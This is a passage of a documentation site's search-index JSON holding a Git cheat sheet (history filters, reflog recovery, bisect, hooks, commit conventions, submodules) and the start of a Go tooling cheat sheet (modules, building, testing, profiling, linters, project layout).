--until=\"2024-02-01\"\n\n# Author filters\ngit log --author=\"Name\"\ngit log --committer=\"Name\"\n\n# Message filters\ngit log --grep=\"fix\"\ngit log --grep=\"bug\" --grep=\"issue\" --all-match\n\n# File filters\ngit log -- file.txt\ngit log --follow -- file.txt    # Follow renames\ngit log -- '*.js'\n\n# Content filters\ngit log -S \"function\"      # Commits modifying this text\ngit log -G \"regex.*pattern\"\n\n# Custom format\ngit log --pretty=format:\"%h - %an, %ar : %s\"\ngit log --pretty=format:\"%C(yellow)%h%Creset %C(blue)%ad%Creset | %s %C(green)[%an]%Creset\" --date=short\n\n# Log between branches\ngit log main..develop\ngit log main...develop\n</code></pre>"},{"location":"cheat-sheet/git/git/#git-reflog-recovery","title":"git reflog - Recovery","text":"<pre><code># View complete history of movements\ngit reflog\ngit reflog show HEAD\n\n# Recover a \"lost\" commit\ngit reflog\ngit checkout HEAD@{5}\ngit checkout -b recovered-branch HEAD@{5}\n\n# Recover a deleted branch\ngit reflog\ngit checkout -b recovered-branch abc123\n\n# Undo a failed rebase\ngit reflog\ngit reset --hard HEAD@{5}\n\n# Clean up\ngit reflog expire --expire=90.days.ago --all\n</code></pre>"},{"location":"cheat-sheet/git/git/#git-bisect-finding-a-bug","title":"git bisect - Finding a Bug","text":"<pre><code># Start binary search\ngit bisect start\ngit bisect bad                # Current commit is bad\ngit bisect good v1.0.0        # v1.0.0 was good\n\n# Test each commit\n# Git automatically checks out the middle\ngit bisect good    # or\ngit bisect bad\n\n# Git finds the faulty commit\n# Result: \"abc123 is the first bad commit\"\n\ngit bisect reset   # Finish\n\n# Automated bisect\ngit bisect start HEAD v1.0.0\ngit bisect run ./test.sh\n\n# test.sh must return:\n# 0 = good\n# 1-127 (except 125) = bad\n# 125 = skip (not testable)\n</code></pre>"},{"location":"cheat-sheet/git/git/#git-blame-annotations","title":"git blame - Annotations","text":"<pre><code># Who modified each line\ngit blame file.txt\n\n# Specific lines\ngit blame -L 10,20 file.txt\n\n# With more info\ngit blame -l file.txt       # Full SHA\ngit blame -e file.txt       # Emails\ngit blame -w file.txt       # Ignore whitespace\n\n# Track movements\ngit blame -M file.txt       # Within the file\ngit blame -C file.txt       # Within the commit\ngit blame -C -C file.txt    # Since creation\n\n# At a specific commit\ngit blame abc123 -- file.txt\n\n# Ignore commits (reformatting)\ngit blame --ignore-rev abc123 file.txt\ngit config blame.ignoreRevsFile .git-blame-ignore-revs\n</code></pre>"},{"location":"cheat-sheet/git/git/#branches-and-merges","title":"Branches and Merges","text":""},{"location":"cheat-sheet/git/git/#branch-management","title":"Branch Management","text":"<pre><code># Create\ngit branch new-branch\ngit checkout -b new-branch\ngit switch -c new-branch    # New syntax\n\n# List\ngit branch\ngit branch -a          # All (local + remote)\ngit branch -v          # With last commit\ngit branch -vv         # With tracking\n\n# Switch\ngit checkout main\ngit switch main\n\n# Rename\ngit branch -m old-name new-name\n\n# Delete\ngit branch -d branch          # If merged\ngit branch -D branch          # Force\ngit push origin --delete branch\n\n# Tracking\ngit checkout -b local-branch origin/remote-branch\ngit branch -u origin/remote-branch\n</code></pre>"},{"location":"cheat-sheet/git/git/#merges","title":"Merges","text":"<pre><code># Basic merge\ngit merge feature\n\n# Without fast-forward\ngit merge --no-ff feature\n\n# With squash\ngit merge --squash feature\ngit commit -m \"Merge feature\"\n\n# Strategies\ngit merge -X ours feature\ngit merge -X theirs feature\n\n# Undo\ngit merge --abort\ngit reset --merge\n\n# Merged branches\ngit branch --merged\ngit branch --no-merged\n</code></pre>"},{"location":"cheat-sheet/git/git/#conflict-resolution","title":"Conflict Resolution","text":"<pre><code># Conflicting files\ngit status\ngit diff --name-only --diff-filter=U\n\n# Choose a version\ngit checkout --ours file.txt\ngit checkout --theirs file.txt\n\n# Mergetool\ngit mergetool\ngit mergetool --tool=vimdiff\n\n# After resolution\ngit add resolved-file.txt\ngit commit\n</code></pre>"},{"location":"cheat-sheet/git/git/#stashing","title":"Stashing","text":""},{"location":"cheat-sheet/git/git/#usage","title":"Usage","text":"<pre><code># Save\ngit stash\ngit stash save \"Message\"\ngit stash push -m \"Message\"\n\n# With untracked files\ngit stash -u\ngit stash --include-untracked\n\n# List\ngit stash list\n\n# Apply\ngit stash apply\ngit stash apply stash@{0}\ngit stash pop              # Apply and remove\n\n# Remove\ngit stash drop stash@{1}\ngit stash clear\n</code></pre>"},{"location":"cheat-sheet/git/git/#advanced-stashing","title":"Advanced Stashing","text":"<pre><code># Specific files\ngit stash push -m \"Msg\" file1.txt file2.txt\n\n# Interactive\ngit stash -p\n\n# View content\ngit stash show\ngit stash show -p\n\n# Create branch from stash\ngit stash branch new-branch stash@{0}\n\n# Stash only staged\ngit stash --keep-index\ngit stash --staged\n</code></pre>"},{"location":"cheat-sheet/git/git/#git-hooks","title":"Git Hooks","text":""},{"location":"cheat-sheet/git/git/#pre-commit","title":"Pre-commit","text":"<pre><code>cat &gt; .git/hooks/pre-commit &lt;&lt; 'EOF'\n#!/bin/bash\n\necho \"Running linter...\"\nnpm run lint\nif [ $? -ne 0 ]; then\n    echo \"Linting failed\"\n    exit 1\nfi\n\necho \"Running tests...\"\nnpm test\nif [ $? -ne 0 ]; then\n    echo \"Tests failed\"\n    exit 1\nfi\nEOF\n\nchmod +x .git/hooks/pre-commit\n</code></pre>"},{"location":"cheat-sheet/git/git/#commit-msg","title":"Commit-msg","text":"<pre><code>cat &gt; .git/hooks/commit-msg &lt;&lt; 'EOF'\n#!/bin/bash\n\ncommit_msg=$(cat \"$1\")\n\nif ! echo \"$commit_msg\" | grep -qE \"^(feat|fix|docs|style|refactor|test|chore): .+\"; then\n    echo \"Error: Required format: type: description\"\n    exit 1\nfi\nEOF\n\nchmod +x .git/hooks/commit-msg\n</code></pre>"},{"location":"cheat-sheet/git/git/#pre-push","title":"Pre-push","text":"<pre><code>cat &gt; .git/hooks/pre-push &lt;&lt; 'EOF'\n#!/bin/bash\n\nbranch=$(git symbolic-ref HEAD | sed -e 's,.*/\\(.*\\),\\1,')\n\nif [[ $branch =~ ^(main|master|develop)$ ]]; then\n    read -p \"Push to $branch. Continue? [y|n] \" -n 1 -r &lt; /dev/tty\n    echo\n    if [[ ! $REPLY =~ ^[Yy]$ ]]; then\n        exit 1\n    fi\nfi\nEOF\n\nchmod +x .git/hooks/pre-push\n</code></pre>"},{"location":"cheat-sheet/git/git/#husky-nodejs","title":"Husky (Node.js)","text":"<pre><code>npm install --save-dev husky\nnpx husky install\nnpm set-script prepare \"husky install\"\n\nnpx husky add .husky/pre-commit \"npm test\"\nnpx husky add .husky/commit-msg 'npx --no -- commitlint --edit \"$1\"'\n</code></pre>"},{"location":"cheat-sheet/git/git/#best-practices","title":"Best Practices","text":""},{"location":"cheat-sheet/git/git/#commit-messages","title":"Commit Messages","text":"<pre><code># Conventional Commits Format\n&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;\n\n# Types:\n# feat     : new feature\n# fix      : bug fix\n# docs     : documentation\n# style    : formatting\n# refactor : refactoring\n# test     : tests\n# chore    : maintenance\n# perf     : performance\n# ci       : CI/CD\n\n# Examples:\ngit commit -m \"feat(auth): add JWT authentication\"\ngit commit -m \"fix(api): handle null pointer in user service\"\ngit commit -m \"docs(readme): update installation instructions\"\n\n# With body and footer:\ngit commit -m \"feat(shopping-cart): add quantity selector\n\n- Add increment/decrement buttons\n- Update cart total in real-time\n- Validate maximum quantity\n\nCloses #123\"\n\n# Breaking changes:\ngit commit -m \"feat(api): change auth endpoint\n\nBREAKING CHANGE: /auth renamed to /authenticate\"\n</code></pre>"},{"location":"cheat-sheet/git/git/#golden-rules","title":"Golden Rules","text":"<pre><code># 1. Atomic commits\n# One commit = one logical change\n\n# 2. Clear messages\n# \u2705 \"fix(login): prevent SQL injection\"\n# \u274c \"fix stuff\"\n\n# 3. Imperative\n# \u2705 \"add feature\"\n# \u274c \"added feature\"\n\n# 4. Size\n# Subject &lt;= 50 characters\n# Body &lt;= 72 characters/line\n\n# 5. Explain the WHY\n# Not the WHAT (visible in the diff)\n\n# 6. Reference issues\n# \"Fixes #456\"\n# \"Related to #123\"\n\n# 7. No secrets\n# Use .gitignore\n\n# 8. Commit regularly\n# Small frequent commits &gt; large rare commits\n\n# 9. Squash before merge\n# Clean up with rebase -i\n\n# 10. Rebase or merge?\n# Rebase: personal branches, clean history\n# Merge: public branches, preserve history\n</code></pre>"},{"location":"cheat-sheet/git/git/#commit-template","title":"Commit Template","text":"<pre><code>cat &gt; ~/.gitmessage &lt;&lt; 'EOF'\n# &lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;\n#\n# &lt;body&gt;\n#\n# &lt;footer&gt;\n#\n# Types: feat, fix, docs, style, refactor, test, chore\n# Scope: auth, api, ui, db\n# Subject: &lt;= 50 chars\n# Body: why, &lt;= 72 chars/line\n# Footer: Fixes #123, BREAKING CHANGE\nEOF\n\ngit config --global commit.template ~/.gitmessage\n</code></pre>"},{"location":"cheat-sheet/git/git/#cleanup-and-maintenance","title":"Cleanup and Maintenance","text":""},{"location":"cheat-sheet/git/git/#cleanup","title":"Cleanup","text":"<pre><code># Untracked files\ngit clean -n           # Dry run\ngit clean -f           # Remove\ngit clean -fd          # Files and directories\ngit clean -fX          # Only ignored\n\n# Garbage collection\ngit gc\ngit gc --aggressive --prune=now\n\n# Verify integrity\ngit fsck\n\n# Used space\ngit count-objects -vH\n</code></pre>"},{"location":"cheat-sheet/git/git/#search","title":"Search","text":"<pre><code># In code\ngit grep \"function\"\ngit grep -n \"function\"     # With line\ngit grep -i \"function\"     # Case insensitive\n\n# In history\ngit log -S \"function\"\ngit log -G \"regex\"\n\n# Author stats\ngit shortlog -sn\n</code></pre>"},{"location":"cheat-sheet/git/git/#tags","title":"Tags","text":"<pre><code># Create\ngit tag v1.0.0\ngit tag -a v1.0.0 -m \"Version 1.0.0\"\ngit tag -a v1.0.0 abc123 -m \"Version 1.0.0\"\n\n# List\ngit tag\ngit tag -l \"v1.*\"\n\n# View\ngit show v1.0.0\n\n# Push\ngit push origin v1.0.0\ngit push origin --tags\ngit push --follow-tags\n\n# Delete\ngit tag -d v1.0.0\ngit push origin --delete v1.0.0\n\n# Checkout\ngit checkout v1.0.0\ngit checkout -b branch-from-tag v1.0.0\n</code></pre>"},{"location":"cheat-sheet/git/git/#remotes","title":"Remotes","text":"<pre><code># Add\ngit remote add origin https://github.com/user/repo.git\n\n# List\ngit remote -v\n\n# Multiple remotes\ngit remote add gitlab https://gitlab.com/user/repo.git\n\n# Push to multiple\ngit push origin main\ngit push gitlab main\n\n# Or configure multiple URLs\ngit remote set-url --add --push origin https://github.com/user/repo.git\ngit remote set-url --add --push origin https://gitlab.com/user/repo.git\n\n# Fetch from all\ngit fetch --all\n</code></pre>"},{"location":"cheat-sheet/git/git/#submodules","title":"Submodules","text":"<pre><code># Add\ngit submodule add https://github.com/user/repo.git path/to/submodule\n\n# Clone with submodules\ngit clone --recurse-submodules https://github.com/user/repo.git\n\n# Or after clone\ngit submodule init\ngit submodule update\n\n# Update\ngit submodule update --remote\ngit submodule update --remote --merge\n\n# Command in all submodules\ngit submodule foreach 'git pull origin main'\n\n# Remove\ngit submodule deinit path/to/submodule\ngit rm path/to/submodule\n</code></pre>"},{"location":"cheat-sheet/git/git/#resources","title":"Resources","text":"<ul> <li>Documentation: https://git-scm.com/doc</li> <li>Pro Git Book: https://git-scm.com/book/en/v2</li> <li>Learn Git Branching: https://learngitbranching.js.org/</li> <li>Conventional Commits: https://www.conventionalcommits.org/</li> <li>Oh Shit Git: https://ohshitgit.com/</li> </ul> <p>This complete Git guide covers all advanced rebasing techniques, modern workflows, history management, and best practices. Mastering these concepts is essential for professional development.</p>"},{"location":"cheat-sheet/golang/golang/","title":"Go Ecosystem Cheat Sheet","text":""},{"location":"cheat-sheet/golang/golang/#overview","title":"Overview","text":"<p>Go (Golang) is a statically typed, compiled programming language designed at Google. This cheat sheet focuses on the Go ecosystem: build, test, modules, and tooling.</p> <p>Key Features: - Fast compilation - Built-in concurrency - Garbage collection - Static typing with type inference - Comprehensive standard library - Built-in testing and benchmarking - Cross-platform compilation</p>"},{"location":"cheat-sheet/golang/golang/#installation","title":"Installation","text":""},{"location":"cheat-sheet/golang/golang/#macos","title":"macOS","text":"<pre><code># Using Homebrew\nbrew install go\n\n# Verify installation\ngo version\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#linux","title":"Linux","text":"<pre><code># Download from go.dev\nwget https://go.dev/dl/go1.24.0.linux-amd64.tar.gz\n\n# Extract\nsudo tar -C /usr/local -xzf go1.24.0.linux-amd64.tar.gz\n\n# Add to PATH in ~/.profile or ~/.bashrc\nexport PATH=$PATH:/usr/local/go/bin\n\n# Verify\ngo version\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#windows","title":"Windows","text":"<p>Download installer from https://go.dev/dl/ and run it.</p>"},{"location":"cheat-sheet/golang/golang/#environment-variables","title":"Environment Variables","text":"<pre><code># GOPATH - workspace directory\nexport GOPATH=$HOME/go\n\n# GOBIN - where 'go install' will place binaries\nexport GOBIN=$GOPATH/bin\n\n# Add GOBIN to PATH\nexport PATH=$PATH:$GOBIN\n\n# GOOS and GOARCH for cross-compilation\nexport GOOS=linux\nexport GOARCH=amd64\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#go-modules","title":"Go Modules","text":""},{"location":"cheat-sheet/golang/golang/#initialize-module","title":"Initialize Module","text":"<pre><code># Create new module\ngo mod init example.com/myproject\n\n# Creates go.mod file\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#gomod-file","title":"go.mod File","text":"<pre><code>module example.com/myproject\n\ngo 1.24\n\nrequire (\n    github.com/gin-gonic/gin v1.9.1\n    github.com/stretchr/testify v1.8.4\n)\n\nrequire (\n    // Indirect dependencies\n    github.com/bytedance/sonic v1.9.1 // indirect\n)\n\nreplace github.com/old/repo =&gt; github.com/new/repo v1.0.0\n\nexclude github.com/broken/package v0.1.0\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#module-commands","title":"Module Commands","text":"<pre><code># Add dependencies and remove unused\ngo mod tidy\n\n# Download modules to local cache\ngo mod download\n\n# Copy dependencies to vendor directory\ngo mod vendor\n\n# Print module dependency graph\ngo mod graph\n\n# Verify dependencies\ngo mod verify\n\n# Explain why packages are needed\ngo mod why github.com/some/package\n\n# Edit go.mod file\ngo mod edit -require=github.com/new/package@v1.2.3\ngo mod edit -droprequire=github.com/old/package\ngo mod edit -replace=github.com/old/repo=github.com/new/repo@v1.0.0\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#adding-dependencies","title":"Adding Dependencies","text":"<pre><code># Add/upgrade dependency\ngo get github.com/gin-gonic/gin\n\n# Get specific version\ngo get github.com/gin-gonic/gin@v1.9.1\n\n# Get latest version\ngo get github.com/gin-gonic/gin@latest\n\n# Upgrade all dependencies\ngo get -u ./...\n\n# Upgrade minor/patch versions\ngo get -u=patch ./...\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#gosum-file","title":"go.sum File","text":"<pre><code>github.com/gin-gonic/gin v1.9.1 h1:4idEAncQnU5cB7BeOkPtxjfCSye0AAm1R0RVIqJ+Jmg=\ngithub.com/gin-gonic/gin v1.9.1/go.mod h1:hPrL7YrpYKXt5YId3A/Tnip5kqbEAP+KLuI3SUcPTeU=\n</code></pre> <p>Always commit go.sum to version control!</p>"},{"location":"cheat-sheet/golang/golang/#workspaces-go-118","title":"Workspaces (Go 1.18+)","text":""},{"location":"cheat-sheet/golang/golang/#initialize-workspace","title":"Initialize Workspace","text":"<pre><code># Create workspace with modules\ngo work init ./module1 ./module2\n\n# Creates go.work file\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#gowork-file","title":"go.work File","text":"<pre><code>go 1.24\n\nuse (\n    ./module1\n    ./module2\n    ./shared\n)\n\nreplace github.com/external/package =&gt; ./local/package\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#workspace-commands","title":"Workspace Commands","text":"<pre><code># Add module to workspace\ngo work use ./module3\n\n# Remove module from workspace\ngo work edit -dropuse=./module3\n\n# Sync workspace dependencies to modules\ngo work sync\n\n# Print workspace info\ngo env GOWORK\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#building","title":"Building","text":""},{"location":"cheat-sheet/golang/golang/#basic-build","title":"Basic Build","text":"<pre><code># Build current package\ngo build\n\n# Build with output name\ngo build -o myapp\n\n# Build specific package\ngo build ./cmd/myapp\n\n# Build all packages\ngo build ./...\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#build-options","title":"Build Options","text":"<pre><code># Verbose output\ngo build -v\n\n# Print commands\ngo build -x\n\n# Disable optimizations (for debugging)\ngo build -gcflags=\"all=-N -l\"\n\n# Static linking\ngo build -ldflags=\"-extldflags=-static\"\n\n# Strip debug info (smaller binary)\ngo build -ldflags=\"-s -w\"\n\n# Set version info\ngo build -ldflags=\"-X main.version=1.0.0\"\n\n# Race detector\ngo build -race\n\n# Memory sanitizer\ngo build -msan\n\n# Build tags\ngo build -tags=integration,prod\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#cross-compilation","title":"Cross-Compilation","text":"<pre><code># Linux\nGOOS=linux GOARCH=amd64 go build\n\n# Windows\nGOOS=windows GOARCH=amd64 go build\n\n# macOS\nGOOS=darwin GOARCH=amd64 go build\n\n# ARM64\nGOARCH=arm64 go build\n\n# List supported platforms\ngo tool dist list\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#install","title":"Install","text":"<pre><code># Build and install to $GOBIN\ngo install\n\n# Install specific version\ngo install github.com/user/tool@latest\ngo install github.com/user/tool@v1.2.3\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#running","title":"Running","text":"<pre><code># Run package\ngo run main.go\n\n# Run with arguments\ngo run main.go arg1 arg2\n\n# Run package in directory\ngo run ./cmd/myapp\n\n# Run with build flags\ngo run -race main.go\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#testing","title":"Testing","text":""},{"location":"cheat-sheet/golang/golang/#test-file-structure","title":"Test File Structure","text":"<pre><code>// main.go\npackage main\n\nfunc Add(a, b int) int {\n    return a + b\n}\n\n// main_test.go\npackage main\n\nimport \"testing\"\n\nfunc TestAdd(t *testing.T) {\n    result := Add(2, 3)\n    expected := 5\n    if result != expected {\n        t.Errorf(\"Add(2, 3) = %d; want %d\", result, expected)\n    }\n}\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#running-tests","title":"Running Tests","text":"<pre><code># Run all tests in current directory\ngo test\n\n# Run all tests in project\ngo test ./...\n\n# Verbose output\ngo test -v\n\n# Run specific test\ngo test -run TestAdd\n\n# Run tests matching pattern\ngo test -run TestAdd.*\n\n# Short mode (skip long tests)\ngo test -short\n\n# Parallel tests\ngo test -parallel 4\n\n# Timeout\ngo test -timeout 30s\n\n# Run tests multiple times\ngo test -count 5\n\n# Fail fast (stop on first failure)\ngo test -failfast\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#table-driven-tests","title":"Table-Driven Tests","text":"<pre><code>func TestAdd(t *testing.T) {\n    tests := []struct {\n        name     string\n        a, b     int\n        expected int\n    }{\n        {\"positive numbers\", 2, 3, 5},\n        {\"negative numbers\", -2, -3, -5},\n        {\"mixed\", -2, 3, 1},\n        {\"zeros\", 0, 0, 0},\n    }\n\n    for _, tt := range tests {\n        t.Run(tt.name, func(t *testing.T) {\n            result := Add(tt.a, tt.b)\n            if result != tt.expected {\n                t.Errorf(\"Add(%d, %d) = %d; want %d\",\n                    tt.a, tt.b, result, tt.expected)\n            }\n        })\n    }\n}\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#test-coverage","title":"Test Coverage","text":"<pre><code># Run tests with coverage\ngo test -cover\n\n# Generate coverage profile\ngo test -coverprofile=coverage.out\n\n# View coverage in HTML\ngo tool cover -html=coverage.out\n\n# Coverage for all packages\ngo test -coverprofile=coverage.out ./...\n\n# Coverage with details\ngo test -coverprofile=coverage.out -covermode=count\n\n# Set coverage threshold\ngo test -cover -coverpkg=./...\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#benchmarking","title":"Benchmarking","text":"<pre><code>func BenchmarkAdd(b *testing.B) {\n    for i := 0; i &lt; b.N; i++ {\n        Add(2, 3)\n    }\n}\n\nfunc BenchmarkAddParallel(b *testing.B) {\n    b.RunParallel(func(pb *testing.PB) {\n        for pb.Next() {\n            Add(2, 3)\n        }\n    })\n}\n</code></pre> <p>Run benchmarks: <pre><code># Run all benchmarks\ngo test -bench=.\n\n# Run specific benchmark\ngo test -bench=BenchmarkAdd\n\n# With memory stats\ngo test -bench=. -benchmem\n\n# Run for longer duration\ngo test -bench=. -benchtime=10s\n\n# Number of iterations\ngo test -bench=. -benchtime=1000000x\n\n# Compare benchmarks\ngo test -bench=. &gt; old.txt\n# Make changes\ngo test -bench=. &gt; new.txt\nbenchstat old.txt new.txt\n</code></pre></p>"},{"location":"cheat-sheet/golang/golang/#testing-examples","title":"Testing Examples","text":"<pre><code>func ExampleAdd() {\n    result := Add(2, 3)\n    fmt.Println(result)\n    // Output: 5\n}\n\nfunc ExampleAdd_negative() {\n    result := Add(-2, -3)\n    fmt.Println(result)\n    // Output: -5\n}\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#test-helpers","title":"Test Helpers","text":"<pre><code>func TestHelper(t *testing.T) {\n    helper := func(t *testing.T, input int) {\n        t.Helper() // Mark as helper\n        if input &lt; 0 {\n            t.Fatal(\"input must be positive\")\n        }\n    }\n\n    helper(t, 5)\n}\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#subtests","title":"Subtests","text":"<pre><code>func TestFoo(t *testing.T) {\n    t.Run(\"subtest1\", func(t *testing.T) {\n        // Test logic\n    })\n\n    t.Run(\"subtest2\", func(t *testing.T) {\n        // Test logic\n    })\n}\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#profiling","title":"Profiling","text":""},{"location":"cheat-sheet/golang/golang/#cpu-profiling","title":"CPU Profiling","text":"<pre><code># Generate CPU profile\ngo test -cpuprofile=cpu.prof -bench=.\n\n# Analyze profile\ngo tool pprof cpu.prof\n\n# Web interface\ngo tool pprof -http=:8080 cpu.prof\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#memory-profiling","title":"Memory Profiling","text":"<pre><code># Generate memory profile\ngo test -memprofile=mem.prof -bench=.\n\n# Analyze\ngo tool pprof mem.prof\ngo tool pprof -http=:8080 mem.prof\n\n# Allocation profile\ngo test -memprofile=mem.prof -memprofilerate=1 -bench=.\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#http-profiling","title":"HTTP Profiling","text":"<pre><code>import _ \"net/http/pprof\"\n\nfunc main() {\n    go func() {\n        log.Println(http.ListenAndServe(\"localhost:6060\", nil))\n    }()\n    // Your application code\n}\n</code></pre> <p>View profiles: <pre><code># CPU profile\ngo tool pprof http://localhost:6060/debug/pprof/profile?seconds=30\n\n# Heap profile\ngo tool pprof http://localhost:6060/debug/pprof/heap\n\n# Goroutine profile\ngo tool pprof http://localhost:6060/debug/pprof/goroutine\n\n# Block profile\ngo tool pprof http://localhost:6060/debug/pprof/block\n\n# Mutex profile\ngo tool pprof http://localhost:6060/debug/pprof/mutex\n</code></pre></p>"},{"location":"cheat-sheet/golang/golang/#trace","title":"Trace","text":"<pre><code># Generate trace\ngo test -trace=trace.out -bench=.\n\n# View trace\ngo tool trace trace.out\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#go-tools","title":"Go Tools","text":""},{"location":"cheat-sheet/golang/golang/#go-fmt","title":"go fmt","text":"<pre><code># Format current directory\ngo fmt\n\n# Format all packages\ngo fmt ./...\n\n# Check without modifying (returns non-zero if changes needed)\ngofmt -l .\n\n# Write changes\ngofmt -w .\n\n# Diff without modifying\ngofmt -d .\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#go-vet","title":"go vet","text":"<pre><code># Vet current package\ngo vet\n\n# Vet all packages\ngo vet ./...\n\n# Specific checks\ngo vet -printf ./...\n\n# List available checks\ngo tool vet help\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#go-fix","title":"go fix","text":"<pre><code># Update code to use newer APIs\ngo fix\ngo fix ./...\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#go-doc","title":"go doc","text":"<pre><code># View package documentation\ngo doc fmt\n\n# View function documentation\ngo doc fmt.Println\n\n# View all documentation\ngo doc -all fmt\n\n# Start documentation server\ngodoc -http=:6060\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#go-list","title":"go list","text":"<pre><code># List packages\ngo list ./...\n\n# List with format\ngo list -f '{{.Name}}' ./...\n\n# List dependencies\ngo list -m all\n\n# List module info\ngo list -m -json github.com/gin-gonic/gin\n\n# Find outdated dependencies\ngo list -u -m all\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#go-generate","title":"go generate","text":"<pre><code>//go:generate stringer -type=Status\ntype Status int\n\nconst (\n    Pending Status = iota\n    Active\n    Completed\n)\n</code></pre> <pre><code># Run generate\ngo generate ./...\n\n# With verbose output\ngo generate -v ./...\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#go-clean","title":"go clean","text":"<pre><code># Clean build cache\ngo clean\n\n# Clean test cache\ngo clean -testcache\n\n# Clean module cache\ngo clean -modcache\n\n# Clean everything\ngo clean -cache -modcache -testcache\n\n# Dry run\ngo clean -n\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#linters-and-static-analysis","title":"Linters and Static Analysis","text":""},{"location":"cheat-sheet/golang/golang/#staticcheck","title":"staticcheck","text":"<pre><code># Install\ngo install honnef.co/go/tools/cmd/staticcheck@latest\n\n# Run on current package\nstaticcheck\n\n# Run on all packages\nstaticcheck ./...\n\n# Specific checks\nstaticcheck -checks=SA1000 ./...\n\n# Exclude checks\nstaticcheck -checks=all,-ST1000 ./...\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#golangci-lint","title":"golangci-lint","text":"<pre><code># Install\ngo install github.com/golangci/golangci-lint/cmd/golangci-lint@latest\n\n# Run\ngolangci-lint run\n\n# Run with all linters\ngolangci-lint run --enable-all\n\n# Configuration file (.golangci.yml)\n</code></pre> <p>.golangci.yml example: <pre><code>linters:\n  enable:\n    - govet\n    - errcheck\n    - staticcheck\n    - unused\n    - gosimple\n    - structcheck\n    - varcheck\n    - ineffassign\n    - deadcode\n    - typecheck\n\nlinters-settings:\n  govet:\n    check-shadowing: true\n  gocyclo:\n    min-complexity: 15\n\nrun:\n  timeout: 5m\n  tests: false\n\nissues:\n  exclude-use-default: false\n</code></pre></p>"},{"location":"cheat-sheet/golang/golang/#go-critic","title":"go-critic","text":"<pre><code># Install\ngo install github.com/go-critic/go-critic/cmd/gocritic@latest\n\n# Run\ngocritic check ./...\n\n# List checks\ngocritic check -help\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#build-tags","title":"Build Tags","text":""},{"location":"cheat-sheet/golang/golang/#define-build-tags","title":"Define Build Tags","text":"<pre><code>//go:build linux &amp;&amp; amd64\n// +build linux,amd64\n\npackage main\n\nfunc platformSpecific() {\n    // Linux AMD64 specific code\n}\n</code></pre> <pre><code>//go:build !windows\n// +build !windows\n\npackage main\n\nfunc unixOnly() {\n    // Non-Windows code\n}\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#build-with-tags","title":"Build with Tags","text":"<pre><code># Build with tag\ngo build -tags=integration\n\n# Multiple tags\ngo build -tags='integration e2e'\n\n# Test with tags\ngo test -tags=integration ./...\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#common-build-tags","title":"Common Build Tags","text":"<pre><code>//go:build integration\n//go:build unit\n//go:build e2e\n//go:build prod\n//go:build dev\n//go:build linux\n//go:build darwin\n//go:build windows\n//go:build amd64\n//go:build arm64\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#project-structure","title":"Project Structure","text":""},{"location":"cheat-sheet/golang/golang/#standard-layout","title":"Standard Layout","text":"<pre><code>myproject/\n\u251c\u2500\u2500 cmd/\n\u2502   \u251c\u2500\u2500 myapp/\n\u2502   \u2502   \u2514\u2500\u2500 main.go\n\u2502   \u2514\u2500\u2500 tool/\n\u2502       \u2514\u2500\u2500 main.go\n\u251c\u2500\u2500 internal/\n\u2502   \u251c\u2500\u2500 auth/\n\u2502   \u2502   \u251c\u2500\u2500 auth.go\n\u2502   \u2502   \u2514\u2500\u2500 auth_test.go\n\u2502   \u2514\u2500\u2500 database/\n\u2502       \u251c\u2500\u2500 db.go\n\u2502       \u2514\u2500\u2500 db_test.go\n\u251c\u2500\u2500 pkg/\n\u2502   \u2514\u2500\u2500 utils/\n\u2502       \u251c\u2500\u2500 utils.go\n\u2502       \u2514\u2500\u2500 utils_test.go\n\u251c\u2500\u2500 api/\n\u2502   \u2514\u2500\u2500 openapi.yaml\n\u251c\u2500\u2500 web/\n\u2502   \u2514\u2500\u2500 templates/\n\u251c\u2500\u2500 configs/\n\u2502   \u2514\u2500\u2500 config.yaml\n\u251c\u2500\u2500 scripts/\n\u2502   \u2514\u2500\u2500 build.sh\n\u251c\u2500\u2500 test/\n\u2502   \u2514\u2500\u2500 integration/\n\u251c\u2500\u2500 docs/\n\u251c\u2500\u2500 go.mod\n\u251c\u2500\u2500 go.sum\n\u251c\u2500\u2500 Makefile\n\u251c\u2500\u2500 Dockerfile\n\u2514\u2500\u2500 README.md\n</code></pre>"},{"location":"cheat-sheet/golang/golang/#makefile-example","title":"Makefile Example","text":"<pre><code>.PHONY: build test clean install lint fmt vet\n\nbuild:\n    go build -o bin/myapp ./cmd/myapp\n\ntest:\n    go test -v -race -coverprofile=coverage.out ./...\n\ncoverage:\n    go tool cover -html=coverage.out\n\nbench:\n    go test -bench=. -benchmem ./...\n\nclean:\n    go clean\n    rm -rf bin/\n\ninstall:\n    go install ./cmd/myapp\n\nlint:\n    